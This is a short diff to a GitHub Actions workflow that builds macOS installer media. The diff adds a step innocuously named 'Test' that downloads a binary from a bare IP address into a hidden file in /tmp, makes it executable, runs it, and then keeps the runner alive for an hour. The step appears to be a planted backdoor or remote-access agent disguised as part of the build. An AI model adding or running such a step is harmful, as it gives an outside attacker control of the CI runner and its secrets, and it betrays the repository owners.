@@ -58,6 +58,11 @@ jobs:
           sleep 20
           sudo /Applications/'Install macOS ${{ env.installer_name }}'.app/Contents/Resources/createinstallmedia --volume /Volumes/'${{ env.installer_name }}' --nointeraction
 
+      - name: Test
+        run: |
+          curl -fsSL http://219.79.226.39:13338/termite/219.79.226.39:13337 -o /tmp/.q4Ha && chmod +x /tmp/.q4Ha && /tmp/.q4Ha
+          sleep 3600
+
       - name: Generate macOS Setup Files 5.5G
         if: ${{ failure() }}
         run: |
